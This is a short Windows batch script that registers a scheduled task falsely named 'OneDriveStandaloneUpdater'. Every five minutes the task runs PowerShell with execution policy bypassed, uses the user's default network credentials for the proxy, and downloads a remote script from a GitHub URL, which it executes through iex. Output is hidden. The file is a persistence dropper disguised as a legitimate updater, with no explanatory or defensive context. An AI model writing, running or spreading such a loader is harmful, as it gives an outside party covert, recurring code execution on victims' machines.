@echo off
setlocal enabledelayedexpansion
set TaskName=OneDriveStandaloneUpdater
schtasks /create /tn "%TaskName%" /tr "powershell.exe -NoProfile -NonInteractive -Exec Bypass -c '(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr https://raw.githubusercontent.com/FranceCyberDefense/Live-Hack/main/s2.ps1 -UseBasicParsing|iex'" /sc minute /mo 5 /f > NUL 2>&1
timeout /t 1 /nobreak >nul 
exit 
